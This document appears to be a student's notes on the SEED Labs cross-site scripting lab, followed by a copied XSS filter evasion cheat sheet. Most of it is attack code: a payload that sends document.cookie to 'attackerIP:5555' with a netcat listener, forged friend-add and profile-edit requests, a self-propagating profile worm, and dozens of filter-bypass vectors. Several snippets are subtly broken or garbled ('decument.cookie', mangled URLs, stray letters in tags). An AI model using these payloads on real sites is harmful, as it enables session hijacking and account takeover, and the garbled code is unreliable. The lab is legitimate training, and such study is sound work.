# SEED Labs – Cross-Site Scripting Attack Lab

## Posting a Malicious Message to Display an Alert Window

```js
// short code
<script>alert(document.cookie);</script>


// long code
<script type="text/javascript"
        src="http网站//www.example.com/myscripts.js">
</script>
// store the JavaScript program in a standalone file
// save it with the .js extension
// refer to it using the src attribute in the <script> tag.
```

## stealing cookie

- the browser tries to load the image from the URL in the `src` field
- an `HTTP GET request` sent to the attacker’s machine.
    - in the mean time, it sends the cookies to the `port 5555` of the attacker’s machine

```
// The cookie starts after %3D.

GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

- the attacker has a TCP server listening to the same port.
    - `$ nc -l 5555 -v`
- The server can print out whatever it receives.

```js
// send out the cookies
// http GET
<script>
document.write('<img src=http网址attackerIP:5555?c='
                     + escape(decument.cookie) + ' >');
</script>
```

## Session Hijacking using the Stolen Cookie

```java
import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
    public static void main(String[] args) throws IOException {
    try {
        int responseCode;
        InputStream responseIn=null;

        String requestDetails = "&__elgg_ts=<<correct_elgg_ts_value>>&__elgg_token=<<correct_elgg_token_value>>";

        // URL to be forged.
        URL url = new URL ("http网址www.xsslabelgg.com/action/friends/add?friend=<<friend_user_guid>>"+requestDetails);

        // URLConnection instance is created
        // to further parameterize a resource request past what the state members of URL instance can represent.
        HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
        if (urlConn instanceof HttpURLConnection) {
            urlConn.setConnectTimeout(60000);
            urlConn.setReadTimeout(90000);
        }

        // addRequestProperty method
        // to add HTTP Header Information.
        // add User-Agent HTTP header to the forged HTTP packet.
        // Add other necessary HTTP Headers yourself. Cookies should be stolen
        // using the method in task3.
        urlConn.addRequestProperty("User-agent","Sun JDK 1.6");

        //HTTP Post Data which includes the information to be sent to the server.
        String data = "name=...&guid=..";

        // DoOutput flag of URL Connection
        // should be set to true to send HTTP POST message.
        urlConn.setDoOutput(true);

        // OutputStreamWriter is used to write the HTTP POST data
        // to the url connection.
        OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
        wr.write(data);
        wr.flush();

        // HttpURLConnection a subclass of URLConnection is returned by
        // url.openConnection() since the url is an http request.
        if (urlConn instanceof HttpURLConnection) {
            HttpURLConnection httpConn = (HttpURLConnection) urlConn;
            // Contacts the web server
            // gets the status code from HTTP Response message.
            responseCode = httpConn.getResponseCode();
            System.out.println("Response Code = " + responseCode);

            // HTTP status code
            // HTTP_OK means the response was received sucessfully.
            if (responseCode == HttpURLConnection.HTTP_OK){
                // Get the input stream from url connection object.
                responseIn = urlConn.getInputStream();
                // Create an instance for BufferedReader
                // to read the response line by line.
                BufferedReader buf_inp = new BufferedReader();
                new InputStreamReader(responseIn));
                String inputLine;
                while((inputLine = buf_inp.readLine())!=null) {
                    System.out.println(inputLine);
                    }
                }
            }
            catch (MalformedURLException e) {
                e.printStackTrace();
            }
        }
    }
}
```

### GET with XSS - add friend

1. capture the GET request packet
    - Using the `"HTTP Header Live"` add-on to Inspect HTTP Headers

![Screen Shot 2020-09-20 at 00.16.52](https://i.imgur.com/lzjweg9.png)



2. construct the URL for send add friend Request

```js
<script type="text/javascript">

window.onload = function () {
    // C: js to access Security Token __elgg_token
    var token = "&__elgg_token" + elgg.security.token.__elgg_token;

    // B: js to access Time Stamp __elgg_ts
    var ts = "&__elgg_ts" + elgg.security.token.__elgg_ts;

    // A: Find user ID from LiveHTTPHeader
    var sendurl = "http网址www.web.com/action/add?friend=42"+token+ts;


    // write the Ajax code
    var Ajax=null;
    // create and send Ajax request to add friend
    Ajax = new XMLHttpRequest();

    Ajax.open("GET", sendurl, true);
    Ajax.setRequestHeader("Host", "www.web.com");
    Ajax.setRequestHeader("Keep-Alive", "300");
    Ajax.setRequestHeader("Connection", "keep-alive");

    // D: js to access the session cookie
    Ajax.setRequestHeader("Cookie", document.cookie);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send();
}
</script>
```

### POST with Js - modify profile

![Screen Shot 2020-09-20 at 01.02.54](https://i.imgur.com/75zUEkB.png)

1. capture the POST request packet

2. construct the URL for send add friend Request

3. write the Ajax code

```js
<script type="text/javascript">
window.onload = function(){

    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    //Construct the content
    var content = "My new profile text.";

    //Create and send Ajax request to modify profile
    Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", "www.web.com");
    Ajax.setRequestHeader("Keep-Alive", "300");
    Ajax.setRequestHeader("Connection", "keep-alive");
    Ajax.setRequestHeader("Cookie", document.cookie);
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
}
```

### Writing an XSS worm
- coding a worm which can change the information of an account in the web app.
- This requires the analysis of changing the 'about me' section in the web app.
- The attacker user11 uses the other account samy to update the 'about me' section to study the process.
- The 'inspect element' reveals that the process is a `POST` request which requires few parameters from the document.
  - These parameters are specific to the session and the user,
  - therefore, searching the parameters in the document

The javascript code must contain
- the `post request` required to proceed
- with the changing of the text in the 'about me' section.

```js
<script type="text/javascript">
var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var ts=elgg.security.token__elgg_ts;
var token=elgg.security.token.__elgg_token;

ff=new XMLHttpRequest();

ff.open("POST",sendurl,true);
ff.setRequestHeader("Host","www.xsslabelgg.com");
ff.setRequestHeader("Keep-Alive","300");
ff.setRequestHeader("Connection","keep-alive");
ff.setRequestHeader("Cookie",document.cookie);
ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

// http://www.xsslabelgg.com/profile/user14/edit
ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/"+elgg.session.user["username"]+"/edit");

// __elgg_ts=AAAA&__elgg_token=BBBB&description=User-11-is-great&name=user14&accesslevel[description]=2&guid=user14Id0000001
params="__elgg_ts="+ts+"&__elgg_token="+token+"&description=User-11-is-great"+"&name="+elgg.session.user["username"]+"&accesslevel[description]=2&guid="+elgg.session.user["guid"];

ff.send(params);
```

### self-propagation
- exponential growth
- dynamically generate code


1. **ID/DOM Approach**:
- If the entire JavaScript program (worm) is embedded in the infected profile
- the worm code can use `DOM APIs` to retrieve a copy of itself from the web page.
- This code gets a copy of itself, and display it in an alert window:


```js
// if f the entire JavaScript program (i.e., the worm) is embedded in the infected profile
// to propagate the worm to another profile
// the worm code can use DOM APIs to retrieve a copy of itself from the web page.
<script id="worm" type="text/javascript">
    var badCode = document.getElementById("worm");
    alert(badCode.innerHTML);
</script>

<script id="worm" type="text/javascript">
    // innerHTML only gives us the inside part of the code, var copy = document.getElementById("worm").innerHTML;
    header = "<script id=\"worm\" type=\"text/javascript\">";
    tail = "</" + "script>";
    var wormCode = encodeURIComponent(header+copy+tail);
    alert(jsCode);
</script>
```

2. **Src/Link Approach**:
- If the worm is included using the `src` attribute in the `<script>` tag
- can simply copy the `<script>` tag to the victim’s profile, essentially infecting the profile with the same worm.

```js
<script type="text/javascript" src="http网站//example.com/xss_worm.js">
</script>
```

1. example

```js
<script id="worm" type="text/javascript">

// construct a copy of itself
var selfProp = "<script id==\"worm\" type=\"text/javascript\">"
                .concat(document.getElementById("worm").innerHTML)
                .concat("</").concat("script>");

// main code ...

</script>



<script id="daut" type="text/javascript">
var sp="<script id=\"daut\" type=\"text/javascript\">".concat(document.getElementByID("daut").innerHTML).concat("</").concat("script>");

var sendurl="http://www.xsslabelgg.com/action/profile/edit";
var ts=elgg.security.token__elgg_ts;
var token=elgg.security.token.__elgg_token;

ff=new XMLHttpRequest();
ff.open("POST",sendurl,true);
ff.setRequestHeader("Host","www.xsslabelgg.com");
ff.setRequestHeader("Keep-Alive","300");
ff.setRequestHeader("Connection","keep-alive");
ff.setRequestHeader("Cookie",document.cookie);
ff.setRequestHeader("Content-Type","application/x-www-form-urlencoded");

ff.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/".concat(elgg.session.user["username"]).concat("/edit"));

params="__elgg_ts=".concat(ts).concat("&__elgg_token=").concat(token).concat("&description=User-11-is-great")
.concat(escape(sp)).concat("&name=").concat(elgg.session.user["username"]).concat("&accesslevel[description]=2&guid=")
.concat(elgg.session.user["guid"]);

ff.send(params);


```

# XSS Filter Evasion Cheat Sheet


## find different tag to use

```js
// tag <script> <body> onclik onAnything been blocked

<div style="background:url('javascript:alert(1)')">
```


## strips out word `javascript`

```js
// change line
<div style="background:url('java
            script:alert(1)')">
```


## strips out word `onReadyStateChange`

```js
// break the code
eval('xmlhttp.onread' + 'yStateChange = callback');
```


## Basic XSS Test Without Filter Evasion
- normal XSS JavaScript injection

```js
<SCRIPT SRC=http网址xss.rocks/xss.js></SCRIPT>
```

## XSS Locator (Polygot)
The following is a “polygot test XSS payload.” This test will execute in multiple contexts including html, script string, js and url.

```js
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

---

## Image XSS Using the JavaScript Directive
Image XSS using the JavaScript directive (IE7.0 doesn’t support the JavaScript directive in context of an image, but it does in other contexts, but the following show the principles that would work in other tags as well:

```js
<IMG SRC="javascript:alert('XSS');">
```

## No Quotes and no Semicolon

```js
<IMG SRC=javascript:alert('XSS')>
```

## Case Insensitive XSS Attack Vector
```js
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

---

## HTML Entities
The semicolons are required for this to work:
```js
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
```


## Grave Accent Obfuscation
If you need to use both double and single quotes you can use a grave accent to encapsulate the JavaScript string - this is also useful because lots of cross site scripting filters don’t know about grave accents:

```js
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

## Malformed A Tags
Skip the HREF attribute and get to the meat of the XXS

```js
\< a onmouseover="alert(document.cookie)" \> xxs link \< /a \>
```
or Chrome loves to replace missing quotes
- if you ever get stuck just leave them off
- Chrome will put them in the right place and fix your missing quotes on a URL or script.

```js
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

## Malformed IMG Tags
- cleaned up and shortened to work in all browsers
- this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes. I assume this was originally meant to correct sloppy coding. This would make it significantly more difficult to correctly parse apart an HTML tags:

```js
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

## fromCharCode
- If no quotes of any kind are allowed
- you can `eval() a fromCharCode` in JavaScript to create any XSS vector you need:

```js
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

## `Default SRC Tag` to Get Past Filters that Check SRC Domain
- This will bypass most SRC domain filters.
- Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc.
- It will also allow any relevant event for the tag type to be substituted like `onblur`, `onclick` giving you an extensive amount of variations for many injections listed here.

```js
<IMG SRC=# onmouseover="alert('xxs')">
```

## `Default SRC Tag` by Leaving it Empty

```js
<IMG SRC= onmouseover="alert('xxs')">
```

## Default SRC Tag by Leaving it out Entirely
```js
<IMG onmouseover="alert('xxs')">
```

## On Error Alert

```js
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

## IMG onerror and JavaScript Alert Encode

```js
<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
```
## Decimal HTML Character References
All of the XSS examples that use a javascript: directive inside of an <IMG tag will not work in Firefox or Netscape 8.1+ in the Gecko rendering engine mode).

```js
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
```

## Decimal HTML Character References Without Trailing Semicolons
This is often effective in XSS that attempts to look for `“&#XX;”`, since most people don’t know about padding - up to 7 numeric characters total.
- This is also useful against people who decode against strings like `$tmp_string =~ s/.*\&#(\d+);.*/$1/;` which incorrectly assumes a semicolon is required to terminate a html encoded string:

```js
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
```

## Hexadecimal HTML Character References Without Trailing Semicolons
This is also a viable XSS attack against the above string `$tmp_string=~ s/.*\&#(\d+);.*/$1/;` which assumes that there is a numeric character following the pound symbol - which is not true with hex HTML characters).

```js
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
```

## Embedded Tab
Used to break up the cross site scripting attack:

```js
<IMG SRC="javascript:alert('XSS');">
```

## Embedded Encoded Tab
Use this one to break up XSS :

```js
<IMG SRC="jav&#x09;ascript:alert('XSS');">
```

## Embedded Newline to Break-up XSS
Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:

```js
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
```

## Embedded Carriage Return to Break-up XSS
(Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I’ve seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters.):

```js
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
```

## Null breaks up JavaScript Directive
Null chars also work as XSS vectors but not like above, you need to inject them
- directly using something like Burp Proxy
- use `%00` in the URL string
- write your own injection tool you can either use vim (`^V^@` will produce a null) or the following program to generate it into a text file.
- older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char).
- But the null char `%00` is much more useful and helped to bypass certain real world filters with a variation on this example:

```js
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```


## Spaces and Meta Chars Before the JavaScript in Images for XSS
- This is useful if the pattern match doesn’t take into account spaces in the word javascript: -which is correct since that won’t render- and makes the false assumption that you can’t have a space between the quote and the javascript: keyword.
- The actual reality is you can have any char from 1-32 in decimal:

```js
<IMG SRC=" &#14; javascript:alert('XSS');">
```

## Non-alpha-non-digit XSS
- The Firefox `HTML parser` assumes a non-alpha-non-digit is not valid after an HTML keyword and therefor considers it to be a whitespace or non-valid token after an HTML tag.
- The problem is that some XSS filters assume that the tag they are looking for is broken up by whitespace.
- For example

```js
\<SCRIPT\\s != \<SCRIPT/XSS\\s:

<SCRIPT/XSS SRC="http网址xss.rocks/xss.js"></SCRIPT>
```

Based on the same idea as above, however,expanded on it, using Rnake fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc…) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this also applies to the grave accent char as seen here:

```
<BjsODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit brought this to my attention that there is slightly different behavior between the IE and Gecko rendering engines that allows just a slash between the tag and the parameter with no spaces. This could be useful if the system does not allow spaces.

```js
<SCRIPT/SRC="http网址xss.rocks/xss.js"></SCRIPT>
```

## Extraneous Open Brackets
Submitted by Franz Sedlmaier, this XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course). The double slash comments out the ending extraneous bracket to supress a JavaScript error:

```js
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

## No Closing Script Tags
In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don’t actually need the \></SCRIPT> portion of this Cross Site Scripting vector. Firefox assumes it’s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn’t effect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they’re not needed generally, although beware, I have no idea what the HTML will end up looking like once this is injected:

```
<SjsCRIPT SRC=http网址xss.rocks/xss.js?< B >
```

## Protocol Resolution in Script Tags
This particular variant was submitted by Łukasz Pilorz and was based partially off of Ozh’s protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a `</SCRIPT>` tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The “.j” is valid, regardless of the encoding type because the browser knows it in context of a SCRIPT tag.

```js
<SCRIPT SRC=//xss.rocks/.j>
```


## Half Open HTML/JavaScript XSS Vector
- Unlike Firefox the IE rendering engine doesn’t add extra data to you page, but it does allow the javascript: directive in images. This is useful as a vector because it doesn’t require a close angle bracket. This assumes there is any HTML tag below where you are injecting this cross site scripting vector. Even though there is no close `“>”` tag the tags below it will close it.
- A note: this does mess up the HTML, depending on what HTML is beneath it.
- It gets around the following NIDS regex: `/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/` because it doesn’t require the end `“>”`. As a side note, this was also affective against a real world XSS filter I came across using an open ended `<IFRAME` tag instead of an `<IMG` tag:


```
<IjsMG SRC="`('XSS')"`
```

## Double Open Angle Brackets
- Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering.
- Without it, Firefox will work but Netscape won’t:

```js
<iframe src=http网址xss.rocks/scriptlet.html <
```

## Escaping JavaScript Escapes
- application output some user information inside of a JavaScript like the following:
    - `<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`
- to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character.
- When this gets injected it will read
    - `<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`
    - which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.
- The XSS locator uses this method.:
    - `\";alert('XSS');//`
- An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:

```js
</script><script>alert('XSS');</script>
```

## End Title Tag
This is a simple XSS vector that closes `<TITLE>` tags, which can encapsulate the malicious cross site scripting attack:

```js
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

## INPUT Image
```js
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

## BODY Image
```js
<BODY BACKGROUND="javascript:alert('XSS')">
```

## IMG Dynsrc

```js
<IMG DYNSRC="javascript:alert('XSS')">
```

## IMG Lowsrc

```js
<IMG LOWSRC="javascript:alert('XSS')">
```

## List-style-image
Fairly esoteric issue dealing with embedding images for bulleted lists. This will only work in the IE rendering engine because of the JavaScript directive. Not a particularly useful cross site scripting vector:
```js
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE>
<UL><LI>XSS</br>
```

## VBscript in an Image

```js
<IMG SRC='vbscript:msgbox("XSS")'>
```

## Livescript (older versions of Netscape only)

```js
<IMG SRC="livescript:[code]">
```


## SVG Object Tag
```js
<svg/onload=alert('XSS')>
```

## ECMAScript 6

```js
Set.constructor`alert\x28document.domain\x29
```

## BODY Tag
Method doesn’t require using any variants of javascript: or `<SCRIPT`... to accomplish the XSS attack). Dan Crowley additionally noted that you can put a space before the equals sign `(onload= != onload =)`:

```js
<BODY ONLOAD=alert('XSS')>
```

## Event Handlers
It can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing). Thanks to Rene Ledosquet for the HTML+TIME updates.

The Dottoro Web Reference also has a nice list of events in JavaScript.

```
FSCommand() (attacker can use this when executed from within an embedded Flash object)
onAbort() (when user aborts the loading of an image)
onActivate() (when object is set as the active element)
onAfterPrint() (activates after user prints or previews print job)
onAfterUpdate() (activates on data object after updating data in the source object)
onBeforeActivate() (fires before the object is set as the active element)
onBeforeCopy() (attacker executes the attack string right before a selection is copied to the clipboard - attackers can do this with the execCommand("Copy") function)
onBeforeCut() (attacker executes the attack string right before a selection is cut)
onBeforeDeactivate() (fires right after the activeElement is changed from the current object)
onBeforeEditFocus() (Fires before an object contained in an editable element enters a UI-activated state or when an editable container object is control selected)
onBeforePaste() (user needs to be tricked into pasting or be forced into it using the execCommand("Paste") function)
onBeforePrint() (user would need to be tricked into printing or attacker could use the print() or execCommand("Print") function).
onBeforeUnload() (user would need to be tricked into closing the browser - attacker cannot unload windows unless it was spawned from the parent)
onBeforeUpdate() (activates on data object before updating data in the source object)
onBegin() (the onbegin event fires immediately when the element’s timeline begins)
onBlur() (in the case where another popup is loaded and window looses focus)
onBounce() (fires when the behavior property of the marquee object is set to “alternate” and the contents of the marquee reach one side of the window)
onCellChange() (fires when data changes in the data provider)
onChange() (select, text, or TEXTAREA field loses focus and its value has been modified)
onClick() (someone clicks on a form)
onContextMenu() (user would need to right click on attack area)
onControlSelect() (fires when the user is about to make a control selection of the object)
onCopy() (user needs to copy something or it can be exploited using the execCommand("Copy") command)

```

BGSOUND

```js
<BGSOUND SRC="javascript:alert('XSS');">
```

## & JavaScript includes

```js
<BR SIZE="&{alert('XSS')}">
```

## STYLE sheet

```js
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

## Remote style sheet
Using something as simple as a remote style sheet you can include your XSS as the style parameter can be redefined using an embedded expression. This only works in IE and Netscape 8.1+ in IE rendering engine mode. Notice that there is nothing on the page to show that there is included JavaScript. Note: With all of these remote style sheet examples they use the body tag, so it won’t work unless there is some content on the page other than the vector itself, so you’ll need to add a single letter to the page to make it work if it’s an otherwise blank page:

```js
<LINK REL="stylesheet" HREF="http网址xss.rocks/xss.css">
```

## Remote style sheet part 2
This works the same as above, but uses a `<STYLE>` tag instead of a `<LINK>` tag). A slight variation on this vector was used to hack Google Desktop. As a side note, you can remove the end `</STYLE>` tag if there is HTML immediately after the vector to close it. This is useful if you cannot have either an equals sign or a slash in your cross site scripting attack, which has come up at least once in the real world:

```js
<STYLE>@import'http网址xss.rocks/xss.css';</STYLE>
```

## Remote style sheet part 3
This only works in Opera 8.0 (no longer in 9.x) but is fairly tricky. According to RFC2616 setting a link header is not part of the HTTP1.1 spec, however some browsers still allow it (like Firefox and Opera). The trick here is that I am setting a header (which is basically no different than in the HTTP header saying Link: <http网址xss.rocks/xss.css>; REL=stylesheet) and the remote style sheet with my cross site scripting ## vector is running the JavaScript, which is not supported in FireFox:

```js
<META HTTP-EQUIV="Link" Content="<http网址xss.rocks/xss.css>; REL=stylesheet">
```

## Remote style sheet part 4
This only works in Gecko rendering engines and works by binding an XUL file to the parent page. I think the irony here is that Netscape assumes that Gecko is safer and therefor is vulnerable to this for the vast ## majority of sites:

```js
<STYLE>BODY{-moz-binding:url("http网址xss.rocks/xssmoz.xml#xss")}</STYLE>
```

## STYLE Tags with Broken-up JavaScript for XSS
This XSS at times sends IE into an infinite loop of alerts:

```js
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```
## STYLE Attribute using a Comment to Break-up Expression
Created by Roman Ivanov

```js
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```



## IMG STYLE with Expression
This is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart, like above this can send IE into a loop:

```
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
STYLE Tag (Older versions of Netscape only)
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>

STYLE Tag using Background-image
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>

STYLE Tag using Background
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> <STYLE type="text/css">BODY{background:url("<javascript:alert>('XSS')")}</STYLE>
```

## Anonymous HTML with STYLE Attribute
IE6.0 and Netscape 8.1+ in IE rendering engine mode don’t really care if the HTML tag you build exists or not, as long as it starts with an open angle bracket and a letter:

```js
<XSS STYLE="xss:expression(alert('XSS'))">
```

## Local htc File
This is a little different than the above two cross site scripting vectors because it uses an .htc file which must be on the same server as the XSS vector. The example file works by pulling in the JavaScript and running it as part of the style attribute:
```js
<XSS STYLE="behavior: url(xss.htc);">
```
US-ASCII Encoding
US-ASCII encoding (found by Kurt Huwig).This uses malformed ASCII encoding with 7 bits instead of 8. This XSS may bypass many content filters but only works if the host transmits in US-ASCII encoding, or if you set the encoding yourself. This is more useful against web application firewall cross site scripting evasion than it is server side filter evasion. Apache Tomcat is the only known server that transmits in US-ASCII encoding.
```
¼script¾alert(¢XSS¢)¼/script¾
```
META
The odd thing about meta refresh is that it doesn’t send a referrer in the header - so it can be used for certain types of attacks where you need to get rid of referring URLs:

```js
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
```

META using Data
Directive URL scheme. This is nice because it also doesn’t have anything visibly that has the word SCRIPT or the JavaScript directive in it, because it utilizes base64 encoding. Please see RFC 2397 for more details or go here or here to encode your own. You can also use the XSS calculator below if you just want to encode raw HTML or JavaScript as it has a Base64 encoding method:

```js
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
```

META with Additional URL Parameter
If the target website attempts to see if the URL contains <http网址>; at the beginning you can evade it with the following technique (Submitted by Moritz Naumann):

```js
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http网址;URL=javascript:alert('XSS');">
```

IFRAME
If iframes are allowed there are a lot of other XSS problems as well:

```js
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
```

IFRAME Event Based
IFrames and most other elements can use event based mayhem like the following… (Submitted by: David Cross)

```js
<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
```

FRAME
Frames have the same sorts of XSS problems as iframes

```js
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
```

TABLE

```js
<TABLE BACKGROUND="javascript:alert('XSS')">
```

TD
Just like above, TD’s are vulnerable to BACKGROUNDs containing JavaScript XSS vectors:

```js
<TABLE><TD BACKGROUND="javascript:alert('XSS')">
```

DIV
DIV Background-image

```js
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
```

DIV Background-image with Unicoded XSS Exploit
This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:

```js
<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006
c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
```

## DIV Background-image Plus Extra Characters
Rnaske built a quick XSS fuzzer to detect any erroneous characters that are allowed after the open parenthesis but before the JavaScript directive in IE and Netscape 8.1 in secure site mode. These are in decimal but you can include hex and add padding of course. (Any of the following chars can be used: 1-32, 34, 39, 160, 8192-8.13, 12288, 65279):
```
St...yle=背景图片"xxx: 地址括号 js: 警报括号'your word'括号括号"
```

DIV Expression
A variant of this was effective against a real world cross site scripting filter using a newline between the colon and “expression”:

```js
<DIV STYLE="width: expression(alert('XSS'));">
```

Downlevel-Hidden Block
Only works in IE5.0 and later and Netscape 8.1 in IE rendering engine mode). Some websites consider anything inside a comment block to be safe and therefore does not need to be removed, which allows our Cross Site Scripting vector. Or the system could add comment tags around something to attempt to render it harmless. As we can see, that probably wouldn’t do the job:

```js
<!--[if gte IE 4]>
<SCRIPT>alert('XSS');</SCRIPT>

<![endif]-->
```
BASE Tag
Works in IE and Netscape 8.1 in safe mode. You need the // to comment out the next characters so you won’t get a JavaScript error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like images/image.jpg rather than full paths. If the path includes a leading forward slash like /images/image.jpg you can remove one slash from this vector (as long as there are two to begin the comment this will work):

```js
<BASE HREF="javascript:alert('XSS');//">
```

OBJECT Tag
If they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag). The linked file is actually an HTML file that can contain your XSS:

```js
<OBJECT TYPE="text/x-scriptlet" DATA="http网址xss.rocks/scriptlet.html"></OBJECT>
```

EMBED a Flash Movie That Contains XSS
Click here for a demo: http网址ha.ckers.org/xss.swf

```js
<EMBED SRC="http网址ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
```

If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).

EMBED SVG Which Contains XSS Vector
This example only works in Firefox, but it’s better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.


```js
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv

Using ActionScript Inside Flash for Obfuscation
a="get";
b="URL(\"";
c="javascript:";
d="alert('XSS');\")";
eval(a+b+c+d);
```

XML Data Island with CDATA Obfuscation
This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:

```js
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>

```
Locally hosted XML with embedded JavaScript that is generated using an XML data island
This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:

```js
<XML SRC="xsstest.xml" ID=I></XML>  
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>

```

HTML+TIME in XML
